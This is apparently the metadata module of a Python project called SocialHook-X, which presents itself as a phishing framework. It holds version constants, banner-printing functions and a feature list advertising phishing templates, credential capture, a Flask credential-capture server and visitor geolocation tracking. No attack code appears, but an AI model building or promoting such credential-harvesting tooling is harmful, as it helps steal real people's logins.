"""
SocialHook-X - Project Metadata Module

Contains all project metadata including version, author, and repository information.
"""

from . import colors

# Project Information
PROJECT_NAME = "SocialHook-X"
PROJECT_VERSION = "4.0.0"
TOOL_VERSION = "v3.5"
PROJECT_DESCRIPTION = "Professional Phishing Framework with Advanced Analytics"

# Author Information
AUTHOR = "voltsparx"
AUTHOR_EMAIL = "voltsparx@gmail.com"
AUTHOR_CONTACT = f"{AUTHOR} <{AUTHOR_EMAIL}>"

# Formatted Metadata with Colors
FORMATTED_VERSION = f"{colors.BRIGHT_BLUE}{colors.BOLD}SocialHook-X {TOOL_VERSION}{colors.RESET}"
FORMATTED_AUTHOR = f"{colors.BRIGHT_GREEN}{AUTHOR}{colors.RESET}"
FORMATTED_CONTACT = f"{colors.BRIGHT_GREEN}<{AUTHOR_EMAIL}>{colors.RESET}"
FORMATTED_METADATA = f"{colors.BRIGHT_BLUE}Project:{colors.RESET} {FORMATTED_VERSION} | {colors.BRIGHT_BLUE}Author:{colors.RESET} {FORMATTED_AUTHOR} {FORMATTED_CONTACT}"

# Repository Information
REPOSITORY_URL = "https://github.com/voltsparx/SocialHook-X"
REPOSITORY_ISSUES = f"{REPOSITORY_URL}/issues"
REPOSITORY_WIKI = f"{REPOSITORY_URL}/wiki"

# License Information
LICENSE = "MIT"
LICENSE_YEAR = "2026"

# Build Information
BUILD_DATE = "February 23, 2026"
BUILD_STATUS = "Production Ready"

# Feature Metadata
FEATURES = [
    "44+ Phishing Templates",
    "Advanced Credential Capture",
    "SQLite Database with Analytics",
    "Multi-format Reporting (TXT, JSON, HTML)",
    "Email Alert System",
    "IP Geolocation Tracking",
    "Risk Analysis Engine",
    "Real-time Analytics Dashboard",
    "Multi-channel Notifications",
    "Browser & OS Detection",
]

# Module Metadata
MODULES = {
    "database": {
        "name": "Database Module",
        "description": "Credential and visitor tracking with analytics",
        "version": "1.0.0",
        "dependencies": ["sqlite3", "json", "logging"]
    },
    "webserver": {
        "name": "Web Server Module",
        "description": "Flask-based credential capture server",
        "version": "1.0.0",
        "dependencies": ["flask", "functools", "logging"]
    },
    "notifications": {
        "name": "Notifications Module",
        "description": "Multi-channel alert system (Email, Webhooks, Logging)",
        "version": "1.0.0",
        "dependencies": ["smtplib", "email", "requests", "logging"]
    },
    "geolocation": {
        "name": "Geolocation Module",
        "description": "IP tracking and risk analysis with caching",
        "version": "1.0.0",
        "dependencies": ["requests", "logging", "time"]
    },
    "reports": {
        "name": "Reports Module",
        "description": "Multi-format report generation (TXT, JSON, HTML)",
        "version": "1.0.0",
        "dependencies": ["json", "logging", "pathlib", "datetime"]
    }
}

# Version Information
VERSION_INFO = {
    "major": 4,
    "minor": 0,
    "patch": 0,
    "status": "stable"
}

def get_version():
    """Get formatted version string with colored output."""
    return f"{colors.BRIGHT_BLUE}{colors.BOLD}{PROJECT_NAME}{colors.RESET} {colors.BRIGHT_GREEN}{TOOL_VERSION}{colors.RESET}"

def get_banner():
    """Get project banner with metadata."""
    banner = f"""
{colors.BRIGHT_BLUE}{colors.BOLD}========================================================{colors.RESET}
{colors.BRIGHT_BLUE}{colors.BOLD}     SocialHook-X {TOOL_VERSION} - Professional Phishing Framework    {colors.RESET}
{colors.BRIGHT_BLUE}{colors.BOLD}========================================================{colors.RESET}

{colors.BRIGHT_GREEN}{colors.BOLD}Author:{colors.RESET}      {FORMATTED_AUTHOR} {FORMATTED_CONTACT}
{colors.BRIGHT_GREEN}{colors.BOLD}Version:{colors.RESET}     {TOOL_VERSION}
{colors.BRIGHT_GREEN}{colors.BOLD}Repository:{colors.RESET}  {REPOSITORY_URL}
{colors.BRIGHT_BLUE}License:{colors.RESET}     {LICENSE} - {LICENSE_YEAR}
{colors.BRIGHT_BLUE}Status:{colors.RESET}      {BUILD_STATUS}
{colors.BRIGHT_BLUE}Build Date:{colors.RESET}  {BUILD_DATE}

{colors.BRIGHT_BLUE}{colors.BOLD}========================================================{colors.RESET}
    """
    return banner

def get_full_banner():
    """Get full banner with features list."""
    features_str = "\n".join([f"  {colors.BRIGHT_GREEN}[+]{colors.RESET} {feature}" for feature in FEATURES])
    
    banner = f"""
{colors.BRIGHT_BLUE}{colors.BOLD}========================================================{colors.RESET}
{colors.BRIGHT_BLUE}{colors.BOLD}          SocialHook-X v4.0 - Professional Phishing Framework          {colors.RESET}
{colors.BRIGHT_BLUE}{colors.BOLD}========================================================{colors.RESET}

{colors.BRIGHT_BLUE}{colors.BOLD}Core Information:{colors.RESET}
  {colors.BRIGHT_BLUE}Project:{colors.RESET}  {PROJECT_NAME}
  {colors.BRIGHT_BLUE}Version:{colors.RESET}  {PROJECT_VERSION}
  {colors.BRIGHT_BLUE}Author:{colors.RESET}   {AUTHOR_CONTACT}
  {colors.BRIGHT_BLUE}Repo:{colors.RESET}     {REPOSITORY_URL}

{colors.BRIGHT_BLUE}{colors.BOLD}Key Features:{colors.RESET}
{features_str}

{colors.BRIGHT_BLUE}{colors.BOLD}========================================================{colors.RESET}
    """
    return banner

def print_banner():
    """Print project banner to console."""
    print(get_banner())

def print_full_banner():
    """Print full banner with features."""
    print(get_full_banner())
